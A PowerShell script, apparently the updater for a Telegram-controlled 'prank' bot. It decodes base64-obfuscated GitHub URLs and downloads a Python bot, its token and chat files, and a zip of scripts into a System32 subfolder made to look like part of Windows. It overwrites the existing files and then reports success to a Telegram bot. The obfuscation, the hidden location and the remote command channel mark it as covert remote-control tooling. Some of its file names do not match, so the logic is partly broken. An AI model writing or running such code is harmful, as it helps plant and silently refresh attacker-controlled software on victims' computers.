$token = Get-Content "C:\Windows\System32\ap32\token.txt" -Raw
$chatId = Get-Content "C:\Windows\System32\ap32\chat.txt" -Raw
$zip = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2thdGNodXBhLXNhYmkvcG93ZXJzaGVsbF9wcmFua3MvcmVmcy9oZWFkcy9tYWluL3NjcmlwdHMuemlwP2RsPTE="
$script = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2thdGNodXBhLXNhYmkvcG93ZXJzaGVsbF9wcmFua3MvcmVmcy9oZWFkcy9tYWluL2JvdC5weT9kbD0x"
$tokenfile = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2thdGNodXBhLXNhYmkvcG93ZXJzaGVsbF9wcmFua3MvcmVmcy9oZWFkcy9tYWluL3Rva2VuLnR4dD9kbD0x"
$chatfile = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2thdGNodXBhLXNhYmkvcG93ZXJzaGVsbF9wcmFua3MvcmVmcy9oZWFkcy9tYWluL2NoYXQudHh0P2RsPTE="


try {
    Invoke-WebRequest -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($script))) -OutFile "C:\Windows\System32\ap32\service2.py"
}
catch {
    Write-Host "Erro ao descarregar o script:" $_
    exit
}
try {
    Invoke-WebRequest -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($chatfile))) -OutFile "C:\Windows\System32\ap32\chat2.py"
}
catch {
    Write-Host "Erro ao descarregar o script:" $_
    exit
}
try {
    Invoke-WebRequest -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($tokenfile))) -OutFile "C:\Windows\System32\ap32\temptoken.txt"
}
catch {
    Write-Host "Erro ao descarregar o script:" $_
    exit
}
try {
    Invoke-WebRequest -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($zip))) -OutFile "C:\Windows\System32\ap32\update.zip"
}
catch {
    Write-Host "Erro ao descarregar o script:" $_
    exit
}

if (Test-Path "C:\Windows\System32\ap32\log.py") {
    Remove-Item "C:\Windows\System32\ap32\log.py" -Force
}
Copy-Item -Path "C:\Windows\System32\ap32\service2.py" -Destination "C:\Windows\System32\ap32\log.py" -Force

if (Test-Path "C:\Windows\System32\ap32\chat.txt") {
    Remove-Item "C:\Windows\System32\ap32\chat.txt" -Force
}
Copy-Item -Path "C:\Windows\System32\ap32\chat2.txt" -Destination "C:\Windows\System32\ap32\chat.txt" -Force

if (Test-Path "C:\Windows\System32\ap32\token.txt") {
    Remove-Item "C:\Windows\System32\ap32\token.txt" -Force
}
Copy-Item -Path "C:\Windows\System32\ap32\temptoken.txt" -Destination "C:\Windows\System32\ap32\token.txt" -Force

if (Test-Path "C:\Windows\System32\ap32\update.zip") {
    Remove-Item "C:\Windows\System32\ap32\Res-PE" -Recurse -Force
}

Expand-Archive -Path "C:\Windows\System32\ap32\update.zip" -DestinationPath "C:\Windows\System32\ap32" -Force


Copy-Item -Path "C:\Windows\System32\ap32\scripts" -Destination "C:\Windows\System32\ap32\Res-PE" -Recurse -Force

Remove-Item "C:\Windows\System32\ap32\service2.py" -Force
Remove-Item "C:\Windows\System32\ap32\temptoken.txt" -Force
Remove-Item "C:\Windows\System32\ap32\chat2.py" -Force
Remove-Item "C:\Windows\System32\ap32\update.zip" -Force
Remove-Item "C:\Windows\System32\ap32\scripts" -Recurse -Force


$msg = "Reload dos Scripts completo!"
Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" `
-Method Post `
-ContentType "application/json" `
-Body (@{ chat_id = $chatId; text = $msg } | ConvertTo-Json)
